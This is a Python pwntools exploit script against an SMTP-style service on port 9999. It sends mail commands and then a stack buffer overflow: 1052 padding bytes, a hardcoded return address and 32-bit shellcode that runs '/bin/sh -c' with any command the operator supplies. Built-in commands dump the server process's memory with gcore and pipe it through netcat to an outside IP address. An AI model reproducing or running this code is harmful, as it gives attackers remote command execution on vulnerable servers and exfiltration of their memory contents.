import os
import sys
import time
import subprocess
import argparse

import pwn

MEM_DUMP_FILE = str(os.path.abspath(os.path.join(
    os.sep, 'mem_dump_45454_random')))
RETURN_ADDRESS = '\x06\xd1\xff\xff' #adress of data buffer
# gdb root addr-> ff ff d0 c0 \xc6\xd0\xff\xff 1052
# root simple addr -> ff ff d1 20 \x26\xd1\xff\xff ff ff d1 00
# gdb me addr -> ff ff ca 00 \x06\xca\xff\xff
JMP_ADDRESS = '\x08\x04\x91\x3f' #adress of main loop 0x80498cf

SHELLCODE_TEMPLATE = """
    bits    32

f_cmd:
    mov eax, 2
    int 0x80
    cmp eax, 0
    jnz go_back

    xor     eax, eax
    cdq
    push    eax
    push    '//sh'                                                                                                                                                                                         
    push    '/bin'
    mov     ebx, esp
    push    eax
    push    word '-c'
    mov     edi, esp 
    push    eax
    jmp     l_cmd
r_cmd:
    push    edi
    push    ebx
    mov     ecx, esp
    mov     al, 11
    int     0x80
l_cmd:
    call   r_cmd
    db '{}', 0
go_back:
    mov eax, 0x80498cf
    jmp eax
"""

CREATE_MEMORY_DUMP = ' '.join(['echo "$(id)";', 'my_pid=$$', ';gcore -o', MEM_DUMP_FILE,
                                     '$(ps -o ppid= -p $my_pid)'])
REMOVE_MEMORY_DUMP = ' '.join(['rm', '-f', MEM_DUMP_FILE+'*'])

COPY_MEMORY_DUMP = ' '.join(['tar cf - {}*', '|', 'nc 52.29.24.148 5000'])

def command_shellcode(cmd_str):
    with open('/tmp/shellcode.asm', 'w+') as asm_f:
        asm_f.write(SHELLCODE_TEMPLATE.format(cmd_str))
        asm_f.flush()

    pr = subprocess.Popen(['/bin/bash', '-c', 'nasm -f elf /tmp/shellcode.asm -o /tmp/shellcode.o; echo -n -e "$(for i in `objdump -d /tmp/shellcode.o |grep "^ " |cut -f2`; do echo -n \'\\x\'$i; done)" > /tmp/shellcode.bytes'])
    pr.wait()
    with open('/tmp/shellcode.bytes', 'rb') as data:
        return data.read()


def do_command(cmd_str, host='localhost', port=9999):
    p = pwn.connect(host, port)
    p.sendline('HELO')
    p.recvline()
    time.sleep(0.3)
    p.sendline('MAIL FROM:<bill@localhost.com>')
    p.recvline()
    time.sleep(0.3)
    p.sendline('RCPT TO:<alice@localhost.com>')
    p.recvline()
    time.sleep(0.3)
    p.sendline('DATA\n\x00' + command_shellcode(cmd_str))
    p.write('A'* 1052 + RETURN_ADDRESS)
    p.recvline()
    p.sendline()


def parse():
    parser = argparse.ArgumentParser()
    parser.add_argument("remote_command")
    args = parser.parse_args()
    
    command_str = {'remove_memory_dump': REMOVE_MEMORY_DUMP,
     'create_memory_dump': CREATE_MEMORY_DUMP,
     'copy_memory_dump': COPY_MEMORY_DUMP
    }.get(args.remote_command, args.remote_command)
    return command_str

if __name__ == "__main__":
    do_command(parse())

    
